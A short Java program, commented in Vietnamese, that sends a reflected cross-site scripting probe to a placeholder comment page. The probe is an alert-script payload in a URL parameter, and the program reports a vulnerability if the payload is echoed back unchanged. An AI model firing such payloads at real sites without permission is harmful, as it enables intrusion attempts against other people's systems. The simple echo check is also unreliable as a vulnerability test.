import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class XSSAttackExample {
    public static void main(String[] args) {
        try {
            // URL của trang web cần kiểm tra
            String targetUrl = "http://example.com/comment.php";

            // Đầu vào người dùng chứa mã độc để tấn công XSS
            String userInput = "<script>alert('XSS Attack');</script>";

            // Thực hiện việc mã hóa chuỗi đầu vào người dùng
            String encodedInput = URLEncoder.encode(userInput, "UTF-8");

            // Tạo URL kết hợp với đầu vào người dùng để tấn công XSS
            String attackUrl = targetUrl + "?comment=" + encodedInput;

            // Gửi yêu cầu tới trang web và nhận phản hồi
            URL url = new URL(attackUrl);
            URLConnection connection = url.openConnection();
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            StringBuilder response = new StringBuilder();

            // Đọc phản hồi từ trang web
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            // Kiểm tra xem trang web có thể bị tấn công XSS hay không
            if (response.toString().contains(userInput)) {
                System.out.println("Trang web có lỗ hổng XSS");
            } else {
                System.out.println("Trang web không có lỗ hổng XSS");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
